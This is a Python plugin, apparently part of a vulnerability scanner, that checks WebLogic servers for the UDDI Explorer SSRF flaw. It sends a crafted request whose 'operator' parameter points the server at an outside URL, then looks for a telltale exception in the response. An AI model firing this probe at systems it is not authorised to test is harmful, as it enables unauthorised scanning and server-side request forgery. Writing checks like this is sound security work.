#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'orleven'

import urllib.parse
import requests
requests.packages.urllib3.disable_warnings()

def get_script_info(data=None):
    script_info = {
        "name": "weblogic ssrf",
        "info": "weblogic ssrf.",
        "level": "high",
        "type": "info"
    }
    return script_info

def prove(data):
    data = init(data,'web')
    if data['base_url']:
        url = data['base_url']+'uddiexplorer/SearchPublicRegistries.jsp?operator=http://www.orleven.com/robots.txt&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search'
        try:
            res = requests.get(url, headers=data['headers'], verify=False, timeout=data['timeout'])
            if "weblogic.uddi.client.structures.exception.XML_SoapException" in res.text :
                data['flag'] = 1
                data['data'].append({"page": '/uddiexplorer/SearchPublicRegistries.jsp'})
                data['res'].append({"info": url, "key": "/uddiexplorer/SearchPublicRegistries.jsp"})
        except:
            pass
    return data
